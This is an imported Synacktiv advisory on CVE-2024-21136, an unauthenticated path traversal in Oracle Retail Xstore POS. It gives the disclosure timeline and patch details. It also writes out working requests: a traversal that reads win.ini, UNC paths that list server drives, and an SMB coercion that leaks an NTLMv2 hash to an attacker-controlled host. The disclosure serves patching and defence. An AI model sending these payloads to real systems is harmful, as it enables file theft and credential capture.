---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-29_oracle-retail-xstore-suite-pre-authenticated-path-traversal.md
original_filename: 2024-07-29_oracle-retail-xstore-suite-pre-authenticated-path-traversal.md
title: 'Oracle Retail Xstore Suite: Pre-authenticated Path Traversal'
category: documents
detected_topics:
- path-traversal
- sso
- command-injection
- api-security
tags:
- imported
- documents
- path-traversal
- sso
- command-injection
- api-security
language: en
raw_sha256: b34042a130a52d48f0328cfe20c9a16d3164dabe055dbf7c826ca6503d25910c
text_sha256: 6b5b3894f3f790ed2f5310e5a1da01f9455d67fd090e796ea3b02343ed6c66e5
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# Oracle Retail Xstore Suite: Pre-authenticated Path Traversal

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-29_oracle-retail-xstore-suite-pre-authenticated-path-traversal.md
- Source Type: markdown
- Detected Topics: path-traversal, sso, command-injection, api-security
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `b34042a130a52d48f0328cfe20c9a16d3164dabe055dbf7c826ca6503d25910c`
- Text SHA256: `6b5b3894f3f790ed2f5310e5a1da01f9455d67fd090e796ea3b02343ed6c66e5`


## Content

---
title: "Oracle Retail Xstore Suite: Pre-authenticated Path Traversal"
page_title: "Oracle Retail Xstore Suite: pre-authenticated path traversal"
url: "https://www.synacktiv.com/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal"
final_url: "https://www.synacktiv.com/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal"
authors: ["Louis Wolfers (@TG91aXMK)", "Quentin Roland (@croco_byte)"]
programs: ["Oracle"]
bugs: ["Path traversal", "Security code review"]
publication_date: "2024-07-29"
added_date: "2024-08-06"
source: "pentester.land/writeups.json"
original_index: 124
---

![](../sites/default/files/2023-06/synacktiv-logo-noir.svg)

# Oracle Retail Xstore Suite: pre-authenticated path traversal

29/07/2024  \- [Téléchargement](oracle-retail-xstore-suite-pre-authenticated-path-traversal#) __

Product

Oracle Retail Xstore Suite

Severity

High

Fixed Version(s)

The [July 2024 Oracle Critical Patch Update](https://www.oracle.com/security-alerts/cpujul2024.html) addresses the vulnerability for affected versions.

Affected Version(s)

19.0.5, 20.0.3, 20.0.4, 22.0.0 and 23.0.1

CVE Number

CVE-2024-21136

Authors

Louis Wolfers

Quentin Roland

## Description

### Presentation

[Oracle Retail Xstore Suite](https://docs.oracle.com/en/industries/retail/retail-xstore-point-of-service/21.0/rxprn/c_feature_summary.htm#Overview-794D61F0) is a point-of-sale application that provides the capabilities to carry out day-to-day transactions and conduct daily store activities. Tasks such as scanning items, applying price adjustments, tendering, and printing receipts as well as processing returns, and placing web orders can be performed. Store operations including opening the store, managing registers and tills, and closing the store can be handled through Oracle Retail Xstore Point of Service (POS).

### Issue(s)

Prior to any authentication, application clients load various icons and images from the Oracle Retail Xstore POS through an HTTP request that includes a URL query parameter identifying which resource to fetch. The insecure handling of the value provided in such a parameter causes a path traversal vulnerability through which an unauthenticated attacker could list the content of the hosting server directories, read local files that potentially include sensitive technical data, or exfiltrate authentication information related to the user running the application.

### Timeline

Date | Description  
---|---  
2023.10.21 | Advisory sent to [secalert_us@oracle.com](mailto:secalert_us@oracle.com)  
2023.10.21 | Advisory reception acknowledged by Oracle  
2023.10.24 to 2024.06.25 | Monthly status reports regarding the advisory – vulnerability is under investigation / being addressed  
2024.05.30 | Information request sent to Oracle regarding the release of a fix for the vulnerability  
2024.06.25 | Information request sent to Oracle regarding the release of a fix for the vulnerability  
2024.07.13 | Oracle informs Synacktiv that the vulnerability will be addressed in the next Critical Patch Update. CVE-2024-21136 assigned to the issue.  
  
## Technical details

![](../index.html)

#### Description

The `/xstoremgwt/cheetahImages` endpoint is queried on the Oracle Retail Xstore POS application to load images. The `imageId` query parameter identifies the target resource. Such an endpoint is reachable prior to any authentication.
  
  
  GET /xstoremgwt/cheetahImages?imageId=_imagePromptLoginPwd HTTP/1.1
  Host: xstore.target.local:8443
  [...]
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Type: image/png
  Content-Length: 2740
  
  [...]

Oracle Retail Xstore POS does not properly sanitize the user input transmitted through the `imageId` value. As a result, such an input could contain special characters causing the application to resolve a resource location that is outside the legitimate, expected directory. For instance, providing the `imageId` value `..\..\..\windows\win.ini` will make Oracle Retail Xstore POS retrieve and display the contents of the `win.ini` file from the server's `windows` directory.
  
  
  GET /xstoremgwt/cheetahImages?imageId=..\..\..\..\windows\win.ini HTTP/1.1
  Host: xstore.target.local:8443
  [...]
  
  HTTP/1.1 200 OK
  Connection: close
  Content-Length: 92
  [...]
  
  ; for 16-bit app support
  [fonts]
  [extensions]
  [mci extensions]
  [files]
  [Mail]
  MAPI=1

In addition, a UNC SMB path can also be provided as an `imageId` value. In such a case, the application will attempt to fetch the specified SMB resource. This behavior can in particular be used to list the files included in the various directories of the server hosting the Oracle Retail Xstore POS application. The ability to list directories entries through SMB UNC paths in conjunction with the possibility to retrieve the files themselves makes it possible to browse the file system to search for interesting files, and read their contents.

For example, the following request will return a listing of the files present in the `C:` drive of the machine hosting the application.
  
  
  GET /xstoremgwt/cheetahImages?imageId=\\10.10.10.10\C$\ HTTP/1.1
  Host: xstore.target.local:8443
  [...]
  
  
  HTTP/1.1 200 OK
  Connection: close
  Last-Modified: Wed, 18 Oct 2023 12:55:16 GMT
  Content-Length: 269
  
  [...]
  PerfLogs
  ProgramData
  Program Files
  Program Files (x86)
  Recovery
  swapfile.sys
  System Volume Information
  temp
  Users
  Windows

#### Impact

The present vulnerability can be exploited by an unauthenticated attacker connected to the Oracle Retail Xstore POS network for several purposes.

_**1\. Sensitive file contents retrieval**_

As stated above, an attacker exploiting the path traversal vulnerability could browse the server file system and retrieve the content of interesting files. The impact of such an attack is highly dependent on the environment context. In generic terms, the attacker could potentially gain access to sensitive technical information (cleartext credentials in log outputs, keystore files containing TLS certificates, installed software configurations, etc.) or confidential business data stored on the server.

_**2\. Authentication data disclosure through SMB coercion**_

Apart from listing files on the hosting server, the ability to provide SMB UNC paths through the directory traversal vulnerability could also be exploited by an attacker to steal NTLMv2 authentication data. Indeed, by specifying an attacker-controlled SMB server, it could be possible to take advantage of Window's implicit authentication mechanism to receive cryptographic parts derived from the password of the user running the application. Dictionary attacks could then be performed on such cryptographic parts in order to retrieve the associated cleartext password.

For instance, the following request may be emitted by the attacker.
  
  
  GET /xstoremgwt/cheetahImages?imageId=\\10.10.10.11\test HTTP/1.1
  Host: xstore.target.local:8443
  [...]
  
  HTTP/1.1 500 Server Error
  Connection: close
  Cache-Control: must-revalidate,no-cache,no-store
  Content-Type: text/html;charset=iso-8859-1
  Content-Length: 1464
  
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
  <title>Error 500 java.io.FileNotFoundException: \\10.10.10.11\test (You can&apos;t access this shared folder because your organization&apos;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network)</title>
  </head>
  <body><h2>HTTP ERROR 500 java.io.FileNotFoundException: \\10.10.10.11\test (You can&apos;t access this shared folder because your organization&apos;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network)</h2>
  <table>
  <tr><th>URI:</th><td>/xstoremgwt/cheetahImages</td></tr>
  <tr><th>STATUS:</th><td>500</td></tr>
  <tr><th>MESSAGE:</th><td>java.io.FileNotFoundException: \\10.10.10.11\test (You can&apos;t access this shared folder because your organization&apos;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network)</td></tr>
  <tr><th>SERVLET:</th><td>cheetahImages</td></tr>
  <tr><th>CAUSED BY:</th><td>java.io.FileNotFoundException: \\10.10.10.11\test (You can&apos;t access this shared folder because your organization&apos;s security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network)</td></tr>
  </table>
  
  </body>
  </html>

On the SMB server of the attacker, the following authentication data will be received.
  
  
  $ smbserver.py -smb2support test /test
  [*] Incoming connection (10.10.10.10,63428)
  [*] AUTHENTICATE_MESSAGE (XSTORELAB\testuser.XSTORELAB01)
  [*] User XSTORELAB\testuser authenticated successfully
  [*] testuser::XSTORELAB:aaaaaaaaaaaaaaaa:6[...]5:01[...]00

Partagez cet article
